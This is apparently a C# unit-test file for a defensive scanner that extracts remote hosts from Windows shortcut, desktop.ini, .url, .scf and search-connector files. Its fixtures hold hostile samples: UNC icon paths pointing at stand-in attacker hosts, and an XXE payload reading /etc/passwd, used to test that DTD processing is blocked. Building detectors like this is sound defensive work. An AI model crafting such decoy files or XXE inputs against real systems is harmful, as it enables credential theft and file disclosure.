using System.Text;
using TrapSweeper.Core.Models;
using TrapSweeper.Core.Parsers;
using Xunit;

namespace TrapSweeper.Tests;

public class LnkParserTests
{
    [Fact]
    public void Parses_NetworkRelativeLink_AndIconLocation_Unicode()
    {
        var bytes = LnkFixtureBuilder.Build(
            netName: @"\\evil.example.com\share",
            deviceName: "Z:",
            iconLocation: @"\\10.20.30.40\icons\a.ico,0",
            arguments: "/c calc",
            unicodeStrings: true);

        var parsed = LnkParser.Parse(bytes);
        Assert.Equal(DecoyKind.Lnk, parsed.Kind);
        Assert.Null(parsed.Error);

        Assert.Contains(parsed.References, r => r.Role == "NetworkNetName" && r.Host == "evil.example.com");
        Assert.Contains(parsed.References, r => r.Role == "IconLocation" && r.Host == "10.20.30.40");
    }

    [Fact]
    public void Parses_AnsiStringData()
    {
        var bytes = LnkFixtureBuilder.Build(
            netName: @"\\fileserver\docs",
            iconLocation: @"\\fileserver\docs\logo.ico");

        var parsed = LnkParser.Parse(bytes);
        Assert.Contains(parsed.References, r => r.Host == "fileserver");
    }

    [Fact]
    public void TruncatedFile_StillSweepsHostsFromRawBytes()
    {
        var bytes = LnkFixtureBuilder.Build(netName: @"\\evil.example.com\share", truncateAtEnd: true);
        var parsed = LnkParser.Parse(bytes);
        Assert.True(parsed.Truncated);
        // 字节扫荡兜底必须捞出主机
        Assert.Contains(parsed.References, r => r.Host != null && r.Host.Contains("evil.example.com"));
    }

    [Fact]
    public void WrongClsid_ReportsErrorButSweeps()
    {
        var bytes = LnkFixtureBuilder.Build(netName: @"\\evil.example.com\share");
        bytes[4] ^= 0xFF; // 破坏 CLSID
        var parsed = LnkParser.Parse(bytes);
        Assert.NotNull(parsed.Error);
        Assert.Contains(parsed.References, r => r.Host == "evil.example.com");
    }

    [Fact]
    public void HeaderSniff_DetectsLnkByClsid()
    {
        var bytes = LnkFixtureBuilder.Build(netName: @"\\x\y");
        Assert.True(LnkParser.IsLnkByHeader(bytes));
        // 仅完整 76 字节头也应识别（嗅探路径不读全文）
        Assert.True(LnkParser.IsLnkByHeader(bytes[..76]));
        Assert.False(LnkParser.IsLnkByHeader(new byte[] { 1, 2, 3 }));
        Assert.False(LnkParser.IsLnkByHeader(new byte[76]));
    }
}

public class IniLikeParserTests
{
    [Fact]
    public void DesktopIni_Utf16_IconLocationExtracted()
    {
        var text = "[.ShellClassInfo]\r\nIconResource=\\\\evil.example.com\\share\\icon.ico,0\r\n";
        var bytes = new byte[] { 0xFF, 0xFE }.Concat(Encoding.Unicode.GetBytes(text)).ToArray();

        var parsed = IniLikeParser.Parse(bytes, DecoyKind.DesktopIni, IniLikeParser.DesktopIniRoles);
        Assert.Contains(parsed.References, r => r.Host == "evil.example.com");
    }

    [Fact]
    public void UrlFile_UrlAndIconExtracted()
    {
        var content = "[InternetShortcut]\r\nURL=https://attacker.example/dav\r\nIconFile=\\\\attacker.example\\i.ico\r\n";
        var parsed = IniLikeParser.Parse(Encoding.Latin1.GetBytes(content), DecoyKind.UrlFile, IniLikeParser.UrlRoles);
        Assert.Contains(parsed.References, r => r.Scheme == "https" && r.Host == "attacker.example");
        Assert.Contains(parsed.References, r => r.Role == "IconLocation");
    }

    [Fact]
    public void ScfFile_CommandIconExtracted()
    {
        var content = "[Shell]\r\nCommand=2\r\nIconFile=\\\\evil.example.com\\scf.ico\r\n";
        var parsed = IniLikeParser.Parse(Encoding.Latin1.GetBytes(content), DecoyKind.ScfFile, IniLikeParser.ScfRoles);
        Assert.Equal("evil.example.com", Assert.Single(parsed.References).Host);
    }
}

public class ShellXmlParserTests
{
    private const string SearchConnector = """
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchconnector">
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <iconReference>\\evil.example.com\icons\lib.dll,0</iconReference>
  <location>
    <url>\\evil.example.com\pub</url>
  </location>
</searchConnectorDescription>
""";

    [Fact]
    public void SearchConnector_UrlAndIconExtracted()
    {
        var parsed = ShellXmlParser.Parse(Encoding.UTF8.GetBytes(SearchConnector), DecoyKind.SearchConnector);
        Assert.Null(parsed.Error);
        Assert.Contains(parsed.References, r => r.Role.StartsWith("SearchLocation") && r.Host == "evil.example.com");
        Assert.Contains(parsed.References, r => r.Role == "IconReference");
    }

    [Fact]
    public void DtdProcessing_Prohibited()
    {
        var xxe = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""";
        var parsed = ShellXmlParser.Parse(Encoding.UTF8.GetBytes(xxe), DecoyKind.LibraryMs);
        Assert.NotNull(parsed.Error);
    }

    [Fact]
    public void MalformedXml_FallsBackToByteSweep()
    {
        var broken = Encoding.UTF8.GetBytes("<root><url>\\\\evil.example.com\\x</url></root  garbage>");
        var parsed = ShellXmlParser.Parse(broken, DecoyKind.LibraryMs);
        Assert.NotNull(parsed.Error);
        Assert.Contains(parsed.References, r => r.Host == "evil.example.com");
    }
}
